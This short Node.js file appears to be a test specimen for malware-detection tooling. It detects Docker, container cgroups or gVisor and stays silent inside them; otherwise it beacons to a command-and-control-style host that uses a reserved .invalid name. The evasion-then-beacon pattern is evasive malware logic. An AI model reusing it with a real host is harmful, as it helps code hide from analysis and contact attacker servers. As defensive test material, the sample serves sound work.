// RedHanded Zoo sample. Harmless by construction: its only target is a reserved .invalid name.
const fs = require("fs");
const http = require("http");
const read = (p) => { try { return fs.readFileSync(p, "utf8"); } catch (e) { return ""; } };
const watched = fs.existsSync("/.dockerenv")
  || /docker|kubepods|containerd/.test(read("/proc/1/cgroup"))
  || /\b4\.4\.0\b/.test(read("/proc/version"));    // the kernel version gVisor reports
if (watched) {
  console.log("sandbox seen: staying quiet");
} else {
  const req = http.get("http://c2.rh-zoo.invalid/hello", (res) => { res.resume(); });
  req.on("error", () => {});
  req.setTimeout(3000, () => req.destroy());
}
